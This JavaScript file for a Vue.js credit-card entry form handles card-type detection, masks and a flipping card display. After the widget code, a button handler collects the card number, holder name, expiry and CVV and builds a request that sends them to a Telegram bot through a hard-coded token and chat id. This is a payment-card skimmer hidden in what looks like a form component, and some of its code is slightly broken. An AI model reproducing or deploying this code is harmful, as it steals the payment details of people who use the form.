
new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType () {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";
      
      re = new RegExp('^9792')
      if (number.match(re) != null) return 'troy'

      return "visa"; // default type
    },
		generateCardNumberMask () {
			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
    },
    minCardMonth () {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    }
  },
  watch: {
    cardYear () {
      if (this.cardMonth < this.minCardMonth) {
        this.cardMonth = "";
      }
    }
  },
  methods: {
    flipCard (status) {
      this.isCardFlipped = status;
    },
    focusInput (e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
      }
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    }
  }
});

let but = document.querySelector("button")
but.addEventListener("click", (e) =>{
  
  var num = document.querySelector("#cardNumber").value
  var hold = document.querySelector("#cardName").value
  var expmont = document.querySelector("#cardMonth").value
  let expyr = document.querySelector("#cardYear").value
  let ccv = document.querySelector("#cardCvv").value

  console.log(num)
  console.log(hold)
  console.log(expmont)
  console.log(expyr)
  console.log(ccv)
  var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
  var chatid = -4071018603
  var mytext = `Result is: %0A Number:${num} %0A Hold: ${hold} %0A Month: ${expmont} %0A Year: ${expyr} %0A ccv = ${ccv}` 
  
  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id${chatid}&text=${mytext}/
  `
  let aip = new XMLHttpRequest();
  aip.open("GET", url,true);
  aip.send

})